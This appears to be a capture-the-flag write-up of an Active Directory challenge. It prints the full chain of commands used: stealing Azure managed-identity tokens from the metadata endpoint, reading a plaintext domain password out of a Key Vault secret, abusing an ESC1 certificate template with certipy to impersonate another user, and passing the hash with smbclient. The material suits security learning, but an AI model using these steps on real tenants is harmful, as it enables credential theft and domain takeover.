# Active Directory

Finding a place to start was a little difficult. I did find the IP address
through another request. I do not remember how many 
different commands I ran first, but the next interesting one was:

```bash
response=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s)
access_token=$(echo $response | python -c 'import sys, json; print (json.load(sys.stdin)["access_token"])')
echo The managed identities for Azure resources access token is $access_token
```

This is used to get a beared token for management resources, and running an 
HTTP request to 

```
https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2022-07-01
```
gave me the following result:


```json
{
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv",
    "name": "northpole-ssh-certs-kv",
    "type": "Microsoft.KeyVault/vaults",
    "location": "eastus",
    "tags": {},
    "systemData": {
        "createdBy": "thomas@sanshhc.onmicrosoft.com",
        "createdByType": "User",
        "createdAt": "2023-11-12T01:47:13.059Z",
        "lastModifiedBy": "thomas@sanshhc.onmicrosoft.com",
        "lastModifiedByType": "User",
        "lastModifiedAt": "2023-11-12T01:50:52.742Z"
    },
    "properties": {
        "sku": {
            "family": "A",
            "name": "standard"
        },
        "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
        "accessPolicies": [
            {
                "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
                "objectId": "0bc7ae9d-292d-4742-8830-68d12469d759",
                "permissions": {
                    "keys": [
                        "all"
                    ],
                    "secrets": [
                        "all"
                    ],
                    "certificates": [
                        "all"
                    ],
                    "storage": [
                        "all"
                    ]
                }
            },
            {
                "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
                "objectId": "1b202351-8c85-46f1-81f8-5528e92eb7ce",
                "permissions": {
                    "secrets": [
                        "get"
                    ]
                }
            }
        ],
        "enabledForDeployment": false,
        "enableSoftDelete": true,
        "softDeleteRetentionInDays": 90,
        "vaultUri": "https://northpole-ssh-certs-kv.vault.azure.net/",
        "provisioningState": "Succeeded",
        "publicNetworkAccess": "Enabled"
    }
}
```

The interesting part being the uri for key vault. Changing up the previous
command a little bit, it was possible to get an access token for the vault:


```bash
response=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s)
access_token=$(echo $response | python -c 'import sys, json; print (json.load(sys.stdin)["access_token"])')
echo The managed identities for Azure resources access token is $access_token
```

With this token, I could get information on the secrets from:

```
https://northpole-it-kv.vault.azure.net/secrets/?api-version=7.4
```

And the result was:

```json
{
    "value": [
        {
            "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript",
            "attributes": {
                "enabled": true,
                "created": 1699564823,
                "updated": 1699564823,
                "recoveryLevel": "Recoverable+Purgeable",
                "recoverableDays": 90
            },
            "tags": {}
        }
    ],
    "nextLink": null
}
```

The tmpAddUserScript seemed interesting, so I asked for more info on it:

```
https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4
```

```json
{
    "value": "Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru",
    "id": "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d",
    "attributes": {
        "enabled": true,
        "created": 1699564823,
        "updated": 1699564823,
        "recoveryLevel": "Recoverable+Purgeable",
        "recoverableDays": 90
    },
    "tags": {}
}
```

The convert to SecureString was executed in an unsafe manner, so the password
was saved as plaintext accidentally. This gave me the credentials:

```
Username: elfy
Password: J4`ufC49/J4766
```

First thing to note is, that the password needs an escape character to be used
in commands. I tried out different tools for hours and hours, and tried to 
look into ways to bypass the restriction on the folder through smbclient.
No luck. Finally, running certipy gave some promising results:

```bash
certipy find -u elfy@northpole.local -p J4\`ufC49/J4766 -dc-ip 10.0.0.53
```

Clipping the important part:

```json
    "Certificate Templates": {
        "0": {
            "Template Name": "NorthPoleUsers",
            "Display Name": "NorthPoleUsers",
            "Certificate Authorities": [
                "northpole-npdc01-CA"
            ],
            "Enabled": true,
            "Client Authentication": true,
            "Enrollment Agent": false,
            "Any Purpose": false,
            "Enrollee Supplies Subject": true,
            "Certificate Name Flag": [
                "EnrolleeSuppliesSubject"
            ],
            "Enrollment Flag": [
                "PublishToDs",
                "IncludeSymmetricAlgorithms"
            ],
            "Private Key Flag": [
                "ExportableKey"
            ],
            "Extended Key Usage": [
                "Encrypting File System",
                "Secure Email",
                "Client Authentication"
            ],
            "Requires Manager Approval": false,
            "Requires Key Archival": false,
            "Authorized Signatures Required": 0,
            "Validity Period": "1 year",
            "Renewal Period": "6 weeks",
            "Minimum RSA Key Length": 2048,
            "Permissions": {
                "Enrollment Permissions": {
                    "Enrollment Rights": [
                        "NORTHPOLE.LOCAL\\Domain Admins",
                        "NORTHPOLE.LOCAL\\Domain Users",
                        "NORTHPOLE.LOCAL\\Enterprise Admins"
                    ]
                },
                "Object Control Permissions": {
                    "Owner": "NORTHPOLE.LOCAL\\Enterprise Admins",
                    "Write Owner Principals": [
                        "NORTHPOLE.LOCAL\\Domain Admins",
                        "NORTHPOLE.LOCAL\\Enterprise Admins"
                    ],
                    "Write Dacl Principals": [
                        "NORTHPOLE.LOCAL\\Domain Admins",
                        "NORTHPOLE.LOCAL\\Enterprise Admins"
                    ],
                    "Write Property Principals": [
                        "NORTHPOLE.LOCAL\\Domain Admins",
                        "NORTHPOLE.LOCAL\\Enterprise Admins"
                    ]
                }
            },
            "[!] Vulnerabilities": {
                "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
            }
```

Seems like it's possible to get authentication for other users as Domain User,
which is not good but can be exploited here. I looked at some 
[documentation on Certipy](https://github.com/ly4k/Certipy), 
and finally found out how to possibly exploit this vulnerability. The command
I ended up with was:

```bash
certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -dc-ip 10.0.0.53 -template NorthPoleUsers -ca northpole-npdc01-CA -upn wombleycube@northpole.local -dns npdc01.northpole.local
```

Which gave me the file wombleycube_npdc01.pfx. This could further be used
to get the password hash for wombley with:

```bash
certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53
```

Now that we have the hash, it is just a matter of connecting to the AD with
it:

```bash
./smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b43
```

Under FileShare, inside the folder super_secret_research:

```
alabaster@ssh-server-vm:~/impacket$ cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

Which gives me the flag for the challenge and the passphrase for the next part.